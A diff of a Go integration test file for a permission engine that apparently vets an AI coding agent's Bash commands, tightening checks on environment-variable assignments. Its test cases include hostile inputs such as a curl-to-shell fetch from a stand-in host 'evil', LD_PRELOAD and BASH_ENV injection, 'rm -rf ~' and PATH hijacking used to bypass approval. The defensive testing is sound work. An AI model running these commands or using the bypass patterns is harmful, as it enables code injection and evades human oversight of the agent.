@@ -42,7 +42,7 @@ func buildFullEngine(projectRoot, cwd string) *Engine {
 
 	eng.RegisterRules(
 		secrets.New(pe),
-		envvars.New(),
+		envvars.NewWithEvaluator(eng),
 		assume.New(),
 		webfetch.New(),
 		claudetools.New(),
@@ -297,17 +297,19 @@ func TestIntegration_KcRules(t *testing.T) {
 		})
 	}
 
-	// Compound: `cd`, `export`, and the kc-exe leaf fold most-restrictive-wins
-	// (engine.EvaluateExpression). `cd` and `export` are both in safecmds'
-	// alwaysSafe set (unconditionally, regardless of the exported var), so
-	// they do not demote the fold; the kc-exe leaf recurses to an approved
-	// inner `bats` exactly like the standalone case above. Net: Approve.
+	// Compound: `cd`, `export PATH=/x`, and the kc-exe leaf fold
+	// most-restrictive-wins (engine.EvaluateExpression). The `export PATH=/x` leaf
+	// now lifts PATH into EnvVars, and the env-var rule is DECISIVE for PATH →
+	// Ask (never auto-approved), which demotes the whole fold to Ask (pg2-gkd5e).
+	// This asserts the corrected verdict: a `cd` + dangerous `export` + otherwise
+	// approvable exe MUST NOT be green-lit. (Previously this wrongly asserted
+	// Approve — safecmds approved the bare `export` while envvars merely Abstained.)
 	t.Run("compound cd+export+exe", func(t *testing.T) {
 		cmd := "cd " + projectRoot + " && export PATH=/x && AWS_PROFILE=dev/developers-dev bin/kc exe --ws d-phillipg01 -c c -- bats"
 		in := &hookio.HookInput{ToolName: "Bash", CWD: cwd, ToolInput: makeBashJSON(cmd)}
 		got := eng.EvaluateHook(in)
-		if got.Decision != hookio.Approve {
-			t.Errorf("compound cd+export+exe: got %s (%s: %s) want %s", got.Decision, got.Module, got.Reason, hookio.Approve)
+		if got.Decision != hookio.Ask {
+			t.Errorf("compound cd+export+exe: got %s (%s: %s) want %s", got.Decision, got.Module, got.Reason, hookio.Ask)
 		}
 	})
 }
@@ -460,6 +462,12 @@ func TestIntegration_SubstitutionBodyRecursion(t *testing.T) {
 		{"out process sub nested in cmd sub", "$(cat >(dangerous))"},
 		{"deeply nested", "$(cat $(cat $(malicious)))"},
 		{"env assignment nested sub", "FOO=$(cat $(malicious)) cmd"},
+		// Env-value substitution (leading form): the env-var rule recurses the
+		// VALUE's substitution and escalates decisively (pg2-gkd5e). The engine's
+		// command choke point strips the leading assignment, so envvars is the only
+		// guard — previously this was (wrongly) approved because safecmds approves
+		// the trailing `echo`.
+		{"env value substitution guarded", "FOO=$(curl evil) echo hi"},
 		// Static allowlist FLOOR: git show/diff/log are approved by the git rule
 		// but excluded from the substitution allowlist (textconv/external-diff RCE).
 		// Recursion must NOT unlock them.
@@ -493,10 +501,6 @@ func TestIntegration_SubstitutionBodyRecursion(t *testing.T) {
 		// NEW behavior enabled by the raw-text enumerator: a single-quoted body is
 		// literal, so nothing runs — the echo is approved (was Abstain before).
 		{"single quoted literal", "echo '$(rm -rf ~)'"},
-		// Env-value substitutions are NOT recursed at the command choke point
-		// (deferred to the static classifyExpansion path / pg2-gkd5e); envvars
-		// defers and safecmds approves the echo. MUST remain allow.
-		{"env value substitution deferred", "FOO=$(curl evil) echo hi"},
 	}
 	for _, tt := range mustApprove {
 		t.Run("approve/"+tt.name, func(t *testing.T) {
@@ -525,6 +529,80 @@ func TestIntegration_SubstitutionBodyRecursion(t *testing.T) {
 			got := eng.EvaluateHook(input)
 			if got.Decision != tt.want {
 				t.Errorf("command %q got %v (%s: %s); want %v", tt.command, got.Decision, got.Module, got.Reason, tt.want)
+			}
+		})
+	}
+}
+
+// TestIntegration_EnvVarGuard is the pg2-gkd5e end-to-end acceptance matrix: it
+// drives the env-assignment guard through EvaluateHook (the real PreToolUse
+// decision path, where the leaf fold happens) and asserts the corrected
+// verdicts. The `export PATH=/x && cmd` / `env PATH=/x cmd` / leading
+// `PATH=/x cmd` bypasses are closed (position-independent guard), injectors are
+// rejected decisively, dynamic values inherit the recursed verdict, and ordinary
+// env-free / benign-env commands stay approvable (no false positives).
+func TestIntegration_EnvVarGuard(t *testing.T) {
+	t.Setenv("WORKSPACE_ROOT", "/Users/testuser/workspace")
+	projectRoot := "/Users/testuser/workspace/my-project"
+	cwd := projectRoot
+	eng := buildFullEngine(projectRoot, cwd)
+
+	cases := []struct {
+		name    string
+		command string
+		want    hookio.Decision
+	}{
+		// --- Injectors: DECISIVE Reject regardless of position/value (each var). ---
+		{"export LD_PRELOAD", "export LD_PRELOAD=/evil.so && echo hi", hookio.Reject},
+		{"export DYLD_INSERT_LIBRARIES", "export DYLD_INSERT_LIBRARIES=/e.dylib && echo hi", hookio.Reject},
+		{"export LD_LIBRARY_PATH", "export LD_LIBRARY_PATH=/evil && echo hi", hookio.Reject},
+		{"export DYLD_LIBRARY_PATH", "export DYLD_LIBRARY_PATH=/evil && echo hi", hookio.Reject},
+		{"export BASH_ENV", "export BASH_ENV=/evil.sh && echo hi", hookio.Reject},
+		{"export ENV", "export ENV=/evil.sh && echo hi", hookio.Reject},
+		{"export ZDOTDIR", "export ZDOTDIR=/evil && echo hi", hookio.Reject},
+		{"export BASH_FUNC name", "export BASH_FUNC_foo=bar && echo hi", hookio.Reject},
+		{"leading LD_PRELOAD", "LD_PRELOAD=/evil.so git status", hookio.Reject},
+		{"env-prefix LD_PRELOAD", "env LD_PRELOAD=/evil.so echo hi", hookio.Reject},
+		{"standalone export injector", "export LD_PRELOAD=/evil.so", hookio.Reject},
+		{"standalone env injector", "env ZDOTDIR=/evil", hookio.Reject},
+		{"chained injector wins", "export PATH=/x && export LD_PRELOAD=/y && git status", hookio.Reject},
+		// Append form NAME+=VALUE must not slip past the name-based guard.
+		{"append-form injector", "export LD_PRELOAD+=/evil.so && git status", hookio.Reject},
+
+		// --- PATH/HOME: DECISIVE Ask (never Approve, never Reject). ---
+		{"export PATH compound", "export PATH=/x && git status", hookio.Ask},
+		{"export PATH semicolon", "export PATH=/x ; git status", hookio.Ask},
+		{"standalone export PATH", "export PATH=/x", hookio.Ask},
+		{"env-prefix PATH", "env PATH=/x git status", hookio.Ask},
+		{"leading PATH", "PATH=/x git status", hookio.Ask},
+		{"leading HOME", "HOME=/tmp git status", hookio.Ask},
+		{"chained ask vars", "export PATH=/a && export HOME=/b && git status", hookio.Ask},
+
+		{"export HOME", "export HOME=/tmp && git status", hookio.Ask},
+
+		// --- Value recursion: benign name, dynamic value escalates/inherits. ---
+		{"leading value curl-pipe-sh", "FOO=$(curl evil|sh) echo hi", hookio.Ask},
+		{"export value nested sub", "export FOO=$(cat $(malicious)) && git status", hookio.Ask},
+		{"leading value curl", "FOO=$(curl evil) echo hi", hookio.Ask},
+
+		// --- Regressions: no false positives. ---
+		{"no env approvable", "git status", hookio.Approve},
+		{"benign export approvable", "export SAFE_VAR=1 && echo hi", hookio.Approve},
+		{"benign leading approvable", "FOO=bar echo hi", hookio.Approve},
+		{"chained benign approvable", "export A=1 && export B=2 && echo hi", hookio.Approve},
+		{"export help not demoted", "export --help", hookio.Approve},
+		{"benign safe-substitution value", "FOO=$(git rev-parse HEAD) echo hi", hookio.Approve},
+		// declare -x/typeset are NOT lifted into EnvVars (documented behavior): the
+		// env-var rule does not see the assignment and the unknown `declare` command
+		// Abstains — deferred to Claude Code's prompt, never auto-approved.
+		{"declare -x deferred", "declare -x PATH=/x", hookio.Abstain},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			in := &hookio.HookInput{ToolName: "Bash", CWD: cwd, ToolInput: makeBashJSON(tc.command)}
+			got := eng.EvaluateHook(in)
+			if got.Decision != tc.want {
+				t.Errorf("%s: %q got %s (%s: %s) want %s", tc.name, tc.command, got.Decision, got.Module, got.Reason, tc.want)
 			}
 		})
 	}
